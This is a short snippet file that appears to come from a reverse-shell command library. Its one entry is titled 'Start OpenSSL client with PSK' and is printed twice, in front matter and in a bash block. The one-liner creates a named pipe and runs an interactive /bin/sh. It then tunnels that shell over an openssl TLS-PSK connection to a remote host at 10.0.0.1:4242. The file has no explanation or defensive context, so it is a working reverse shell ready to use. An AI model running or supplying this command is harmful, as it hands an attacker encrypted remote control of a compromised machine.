---
id: 13c5a0c3-3de6-46a7-bc16-9ba334be7e01
name: Start OpenSSL client with PSK
type: command
executor: bash
data: export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove";
  export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1
  | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
output: null
created_at: '2023-04-06T03:56:24.445062+00:00'
updated_at: '2023-04-10T20:25:34.183750+00:00'
---

# Start OpenSSL client with PSK

```bash
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```
